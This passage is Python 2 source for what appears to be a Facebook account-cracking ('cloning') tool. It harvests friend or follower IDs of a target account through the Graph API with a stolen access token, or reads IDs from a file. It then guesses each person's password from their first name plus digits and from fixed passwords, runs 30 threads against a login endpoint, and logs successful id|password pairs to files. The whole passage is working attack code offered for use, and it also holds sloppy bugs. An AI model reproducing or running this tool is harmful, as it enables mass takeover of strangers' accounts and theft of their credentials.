			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from : '+q['name'])
		except KeyError:
			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			crack_b()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token, headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='2':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t  \x1b[1;35mNAME + NUMBER PASS CRACK FOLLOWERS\x1b[0;97m'
		print(47*'-')
		print('')
		p1 = raw_input('\x1b[1;92m Name + digit: ')
		p2 = raw_input('\x1b[1;92m Name + digit: ')
		p3 = raw_input('\x1b[1;92m Name + digit: ')
		p4 = raw_input('\x1b[1;92m Name + digit: ')
		pass5 = raw_input('\x1b[1;92m Password: ')
		pass6 = raw_input('\x1b[1;92m Password: ')
		pass7 = raw_input('\x1b[1;92m Password: ')
		pass8 = raw_input('\x1b[1;92m Password: ')
		idt = raw_input('\x1b[1;96m Input id: ')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from: '+q['name'])
		except KeyError:
			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			crack_b()
		r = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token+'&limit=999999', headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='3':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t  \x1b[1;35mNAME + NUMBER PASS FILE CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		p1 = raw_input('\x1b[1;92m Name + digit: ')
		p2 = raw_input('\x1b[1;92m Name + digit: ')
		p3 = raw_input('\x1b[1;92m Name + digit: ')
		p4 = raw_input('\x1b[1;92m Name + digit: ')
		pass5 = raw_input('\x1b[1;92m Password: ')
		pass6 = raw_input('\x1b[1;92m Password: ')
		pass7 = raw_input('\x1b[1;92m Password: ')
		pass8 = raw_input('\x1b[1;92m Password: ')
		filelist = raw_input('\x1b[1;96m Input file: \x1b[1;97m ')
		try:
			for line in open(filelist , 'r').readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print('')
			print('\t    \x1b[1;37mRequested file not found\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back ')
			crack_b()
	elif select =='0':
	    menu()
	else:
		print('')
		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
		print('')
		crack_b()
	print('\x1b[1;92m Total IDs : '+str(len(id)))
	print('')
	print(47*'-')
	print '\x1b[1;95m             Jutt Badshah Start Cloning'
	print(47*'-')
	print '\x1b[1;96m            Jutt Badshah King Of Facebook'
        print(47*'-')
        print('')
        def main(arg):
            user = arg
            uid, name = user.split('|')
            try:
                pass1 = name.lower() + p1
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass1 + '\n')
                    ok.close()
                    oks.append(uid + pass1)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass1 + '\n')
                    cp.close()
                    cps.append(uid + pass1)
                else:
                    pass2 = name.lower() + p2
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass2 + '\n')
                        ok.close()
                        oks.append(uid + pass2)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass2 + '\n')
                        cp.close()
                        cps.append(uid + pass2)
                    else:
                        pass3 = name.lower() + p3
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass3 + '\n')
                            ok.close()
                            oks.append(uid + pass3)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass3 + '\n')
                            cp.close()
                            cps.append(uid + pass3)
                        else:
                            pass4 = name.lower() + p4
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.apppend(uid + pass4)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass5 + '\n')
                                    ok.close()
                                    oks.append(uid + pass5)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass5 + '\n')
                                    cp.close()
                                    cps.append(uid + pass5)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass6 + '\n')
                                        ok.close()
                                        oks.append(uid + pass6)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass6 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass6)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass7 + '\n')
                                            ok.close()
                                            oks.append(uid + pass7)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass7 + '\n')
                                            cp.close()
                                            cps.append(uid + pass7)
                                        else:
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass8 + '\n')
                                                ok.close()
                                                oks.append(uid + pass8)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8
                                                cp = open('JUTT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass8 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass8)
            except:
			              pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print('')
	print(47*'-')
	print('')
	print '\x1b[1;96mThe process has completed'
	print('\x1b[1;92m Total Ok/Cp:'+str(len(oks)))+'/'+str(len(cps))
	print('')
	print(47*'-')
	print('')
	raw_input('\x1b[1;92m Press enter to back')
	menu()
def name_crack():
	global token
	os.system('clear')
	try:
		token = open('.login.txt','r').read()
	except IOError:
		print('')
		print('\t    \x1b[1;31mToken not found\x1b[0;97m')
		time.sleep(1)
		login_choice()
	os.system('clear')
	print(logo)
	print('')
	print(47*'-')
	print '\t     \x1b[1;35mNAME PASS CLONING\x1b[0;97m'
	print(47*'-')
	print('')
	print '\x1b[1;92m[1] Crack public id'
	print '\x1b[1;92m[2] Crack followers'
	print '\x1b[1;92m[3] Crack file'
	print '\x1b[1;92m[0] Back'
	print('')
	ns()
def ns():
	select = raw_input('\x1b[1;36mSelect option: \x1b[0;97m')
	id=[]
	oks=[]
	cps=[]
	if select =='1':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t    \x1b[1;35mNAME PASS PUBLIC CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		p1 = raw_input('\x1b[1;92m Name + digit: ')
		p2 = raw_input('\x1b[1;92m Name + digit: ')
		p3 = raw_input('\x1b[1;92m Name + digit: ')
		p4 = raw_input('\x1b[1;92m Name + digit: ')
		idt = raw_input('\x1b[1;96m Input id: \x1b[1;97m')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from : '+q['name'])
		except KeyError:
			print('\t    \x1b[1;33mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			name_crack()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token, headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='2':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print('\t    \x1b[1;35mNAME PASS CRACK FOLLOWERS\x1b[0;97m')
		print(47*'-')
		print('')
		p1 = raw_input('\x1b[1;92m Name + digit: ')
		p2 = raw_input('\x1b[1;92m Name + digit: ')
		p3 = raw_input('\x1b[1;92m Name + digit: ')
		p4 = raw_input('\x1b[1;92m Name + digit: ')
		idt = raw_input('\x1b[1;96m Input id: \x1b[1;97m ')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from: '+q['name'])
		except KeyError:
			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			name_crack()
		r = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token+'&limit=999999', headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='3':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t    \x1b[1;35mNAME PASS FILE CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		p1 = raw_input('\x1b[1;92m Name + digit: ')
		p2 = raw_input('\x1b[1;92m Name + digit: ')
		p3 = raw_input('\x1b[1;92m Name + digit: ')
		p4 = raw_input('\x1b[1;92m Name + digit: ')
		try:
			filelist = raw_input('\x1b[1;96m[+] File : \x1b[1;97m')
			for line in open(filelist , 'r').readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print('')
			print('\t    \x1b[1;31m File not found\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back ')
			name_crack()
	elif select =='0':
	    menu()
	else:
		print('')
		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
		print('')
		ns()
	print('\x1b[1;92m Total IDs : '+str(len(id)))
	print('')
	print(47*'-')
	print '\x1b[1;95m             Jutt Badshah Start Cloning'
	print(47*'-')
	print '\x1b[1;96m            Jutt Badshah King Of Facebook'
	print(47*'-')
	print('')
	def main(arg):
            user = arg
            uid, name = user.split('|')
            try:
                pass1 = name.lower() + p1
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass1 + '\n')
                    ok.close()
                    oks.append(uid + pass1)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass1 + '\n')
                    cp.close()
                    cps.append(uid + pass1)
                else:
                    pass2 = name.lower() + p2
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass2 + '\n')
                        ok.close()
                        oks.append(uid + pass2)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass2 + '\n')
                        cp.close()
                        cps.append(uid + pass2)
                    else:
                        pass3 = name.lower() + p3
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass3 + '\n')
                            ok.close()
                            oks.append(uid + pass3)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass3 + '\n')
                            cp.close()
                            cps.append(uid + pass3)
                        else:
                            pass4 = name.lower() + p4
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.apppend(uid + pass4)
            except:
			              pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print('')
	print(47*'-')
	print('')
	print '\x1b[1;96mThe process has completed'
	print('\x1b[1;92m Total Ok/Cp:'+str(len(oks)))+'/'+str(len(cps))
	print('')
	print(47*'-')
	print('')
	raw_input('\x1b[1;92m Press enter to back')
	menu()

if __name__ == '__main__':
	reg()

